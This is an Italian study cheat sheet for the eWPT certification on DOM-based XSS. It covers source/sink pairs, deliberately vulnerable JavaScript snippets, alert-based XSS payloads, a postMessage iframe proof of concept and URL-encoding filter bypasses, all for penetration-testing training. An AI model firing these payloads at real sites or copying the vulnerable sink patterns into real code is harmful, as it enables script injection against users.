---
layout: cheatsheet
cert: ewpt
cert_label: "eWPT"
title: "DOM-Based XSS"
permalink: "/cheatsheet/ewpt/05-cross-site-scripting/04-dom-xss/"
section: "Cross-Site Scripting"
section_order: 5
order: 4
sort_key: 504
---

**Difficoltà:** Advanced
**Time to Master:** 2.5h
**Prerequisiti:** [03-Stored-XSS.md](/cheatsheet/ewpt/05-cross-site-scripting/03-stored-xss/)
**Lab:** PortSwigger Academy, DOM XSS

---

## Obiettivo

Qui la caccia cambia registro: niente request malformate da guardare nei log, niente traffico "sospetto" verso il server, perché il dato non lo tocca proprio. La vulnerabilità vive interamente nel codice JavaScript lato client, e la trovi solo leggendo quel codice — o osservando come una sorgente (source) controllabile finisce dentro una destinazione (sink) pericolosa.

---

## Concetti chiave

### Source e Sink

| Source (input controllabile) | Sink (esecuzione pericolosa) |
|-------------------------------|-------------------------------|
| `location.hash` | `innerHTML` |
| `location.search` | `document.write()` |
| `document.referrer` | `eval()` |
| `window.name` | `setTimeout("...")` (stringa) |
| `postMessage` data | `element.outerHTML` |

Se un source finisce, senza sanitizzazione, in un sink, hai una DOM XSS.

### Esempio di codice vulnerabile

```javascript
// source: location.hash
var pos = document.location.hash.substring(1);
// sink: innerHTML
document.getElementById("output").innerHTML = decodeURIComponent(pos);
```

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| Browser DevTools | Sources tab, breakpoint su sink | traccia flusso dato | fondamentale per DOM XSS |
| Burp DOM Invader | estensione Burp | evidenzia source/sink automaticamente | molto più veloce del debug manuale |
| view-source / JS file | lettura manuale codice | individua pattern source->sink | quando DOM Invader non è disponibile |

---

## Payload / Esempi

### Esempio 1: DOM XSS via location.hash -> innerHTML

```
http://target.com/page#<img src=x onerror=alert(1)>
```

**Spiegazione:** il fragment (`#...`) non viene mai inviato al server, quindi non appare in nessun log server-side; l'intera vulnerabilità è osservabile solo leggendo il JS client-side.

### Esempio 2: DOM XSS via postMessage senza validazione origin

```javascript
// codice vulnerabile nella pagina target
window.addEventListener('message', function(e) {
    document.getElementById('content').innerHTML = e.data;
});
```

PoC da hostare su dominio attaccante:
```html
<iframe src="http://target.com/page" onload="this.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>', '*')"></iframe>
```

**Spiegazione:** la pagina target accetta messaggi da QUALSIASI origine (`*` implicito o controllo origin mancante) e li scrive direttamente nel DOM: un iframe malevolo su un altro sito può iniettare codice.

### Esempio 3: DOM XSS via jQuery `$()` come sink implicito

```javascript
var name = location.hash.slice(1);
$('#welcome').html('Welcome ' + name);   // .html() = sink equivalente a innerHTML
```

```
http://target.com/page#<img src=x onerror=alert(1)>
```

---

## Evasion / Bypass Techniques

### Bypass sanitizzazione parziale lato client

Con un solo `decodeURIComponent()` nel sink (come nell'esempio sopra), basta una singola codifica URL per bypassare un filtro che ispeziona solo la stringa raw pre-decodifica (niente `<` letterale nella richiesta):

```
http://target.com/page#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

Il doppio URL-encoding serve in uno scenario diverso: quando un WAF/proxy davanti all'app decodifica UNA volta per ispezionare il valore (vede ancora caratteri percent-encoded, non `<`, e lo lascia passare) e poi il codice client applica un'ULTERIORE `decodeURIComponent()` esplicita, completando la decodifica fino all'HTML eseguibile:

```
http://target.com/page#%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
```

---

## Lab Hands-On

### Lab 1: PortSwigger, DOM XSS in document.write sink using source location.search
**Obiettivo:** individuare source/sink e costruire PoC
**Difficulty:** Difficile
**Time:** 1h

**Walkthrough breve:**
1. Usa DOM Invader (o leggi manualmente il JS) per trovare source/sink
2. Costruisci URL con payload nel source identificato
3. Conferma esecuzione

---

## Common Mistakes

- Cercare DOM XSS solo guardando la response HTML server-side -> non troverai mai nulla così, il flusso vive interamente nel JS, serve leggere il codice client
- Dimenticare che `location.hash` non arriva mai al server -> nessuna traccia in log server, ma resta comunque perfettamente sfruttabile

---

## Link Utili

- [PortSwigger: DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [DOM XSS Wiki (OWASP)](https://owasp.org/www-community/DOM_Based_XSS)

---

## Connessioni

- **Prerequisito:** [03-Stored-XSS.md](/cheatsheet/ewpt/05-cross-site-scripting/03-stored-xss/)
- **Prossimo Step:** [05-Encoding-Payloads.md](/cheatsheet/ewpt/05-cross-site-scripting/05-encoding-payloads/)

---

## Checklist di padronanza

- [ ] Conosco almeno 5 coppie source/sink pericolose
- [ ] So usare DOM Invader o leggere manualmente il JS per trovarle
- [ ] So costruire un PoC DOM XSS via hash/search/postMessage
